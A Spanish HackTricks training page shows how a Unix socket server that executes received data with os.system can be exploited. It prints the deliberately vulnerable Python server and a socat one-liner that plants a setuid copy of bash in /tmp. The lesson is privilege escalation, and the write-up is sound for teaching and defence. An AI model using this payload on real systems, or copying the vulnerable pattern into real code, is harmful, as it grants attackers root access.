{{#include ../../banners/hacktricks-training.md}}

## Ejemplo de enlace de socket con Python

En el siguiente ejemplo se **crea un socket unix** (`/tmp/socket_test.s`) y todo lo **recibido** va a ser **ejecutado** por `os.system`. Sé que no vas a encontrar esto en la vida real, pero el objetivo de este ejemplo es ver cómo se ve un código que utiliza sockets unix y cómo gestionar la entrada en el peor de los casos.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Ejecuta** el código usando python: `python s.py` y **verifica cómo el socket está escuchando**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Explotar**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
